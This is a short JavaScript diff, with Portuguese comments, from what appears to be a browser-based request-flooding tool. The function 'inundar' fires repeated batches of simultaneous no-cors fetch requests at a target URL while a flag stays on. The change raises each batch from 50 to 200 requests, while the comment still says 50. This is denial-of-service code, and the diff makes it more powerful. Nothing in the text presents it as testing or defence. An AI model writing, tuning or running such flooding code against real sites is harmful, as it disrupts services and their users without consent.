@@ -39,7 +39,7 @@ async function toggleTsunami() {
 async function inundar(url) {
     while (ativo) {
         // Dispara lotes de 50 requisições simultâneas para não travar o celular de vez
-        const disparos = Array.from({ length: 50 }, () => 
+        const disparos = Array.from({ length: 200 }, () => 
             fetch(url, { mode: 'no-cors', cache: 'no-store' })
                 .then(() => { requisicoesEnviadas++; })
                 .catch(() => { requisicoesEnviadas++; })
